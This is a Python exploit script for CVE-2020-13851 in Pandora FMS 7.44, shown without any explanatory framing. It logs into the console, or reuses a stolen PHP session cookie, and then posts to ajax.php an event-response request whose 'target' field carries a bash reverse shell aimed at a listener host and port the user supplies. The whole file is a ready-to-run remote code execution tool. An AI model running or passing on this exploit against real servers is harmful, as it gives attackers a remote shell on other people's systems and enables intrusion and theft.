import requests
import argparse

class Pandora():
    def __init__(self,target,username,password,cookie,lhost,lport):
        self.target = target
        self.username = username
        self.password = password
        self.cookie = cookie
        self.lhost = lhost
        self.lport = lport
        self.url = self.url_fix()

        if args.c:
            print("No credentials provided. Using PHP Session cookie.")
            self.exploit()

        else:
            self.session = self.login_creds()
            self.exploit()

    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def login_creds(self):
        requests.packages.urllib3.disable_warnings()
        print("Login in")
        session = requests.Session()
        login_url = self.url + "/pandora_console/index.php?login=1"

        login_data = {
            "nick":self.username,
            "pass":self.password,
            "login_button":"Login"
        }

        login_url = session.post(login_url,data=login_data)        
        if "Pandora FMS Overview" in login_url.text:
            print("Logged in succesfully :)")
            return session
        else:
            print("Unable to login :(")

    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("Sending payload:")
        exploit_url = self.url + "/pandora_console/ajax.php"

        exploit_data = {
            "page":"include/ajax/events",
            "perform_event_response":"10000000",
            "target":'bash -c "bash -i >& /dev/tcp/'+ self.lhost + '/' + self.lport + ' 0>&1"',
            "response_id":"1"
        }

        if args.c:
            headers = {
                "Cookie": "PHPSESSID=" + self.cookie
            }
            requests.post(exploit_url,data=exploit_data,headers=headers)
        else:
            self.session.post(exploit_url,data=exploit_data)

if __name__ == "__main__":
    print("Pandora FMS 7.44 CVE-2020-13851")
    parser = argparse.ArgumentParser(description='Pandora FMS 7.44 CVE-2020-13851 Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://pwnedpandora.com', required=True)
    parser.add_argument('-u', metavar='<username>', help='A username for login', required=False)
    parser.add_argument('-p', metavar='<password>', help='A password for login', required=False)
    parser.add_argument('-c', metavar='<Session Cookie>', help='The PHP Session Cookie if no creds are found', required=False)
    parser.add_argument('-lhost', metavar='<listening host>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<listening port>', help='Your Listening Port', required=True)
       
    args = parser.parse_args()

    Pandora(args.t,args.u,args.p,args.c,args.lhost,args.lport)
